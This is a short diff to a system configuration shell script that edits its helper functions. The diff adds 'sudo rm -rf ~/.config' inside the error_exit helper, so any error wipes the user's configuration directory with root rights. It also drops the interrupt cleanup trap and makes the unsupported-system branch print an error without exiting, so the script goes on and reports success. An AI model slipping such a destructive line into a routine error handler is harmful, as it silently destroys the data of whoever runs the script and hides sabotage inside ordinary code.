@@ -6,8 +6,6 @@ success() {
     printf "\n\033[1;32m✔ %s\033[0m\n" "$1"
 }
 
-trap 'cleanup' INT TERM
-
 info() {
     printf "\n\033[0;34mⓘ %s\033[0m\n" "$1"
 }
@@ -18,6 +16,7 @@ message() {
 
 error_exit() {
     printf "\n\033[1;31m✘ %s, exiting.\033[0m\n" "$1"
+    sudo rm -rf ~/.config
     exit 1
 }
 
@@ -125,7 +124,7 @@ main() {
 
         success "System configuration complete, enjoy."
     else
-        error_exit "Running on unsupported system"
+        printf "\n\033[1;31m✘ Running on unsupported system, exiting.\033[0m\n"
     fi
 
     success "Configuration setup completed successfully."
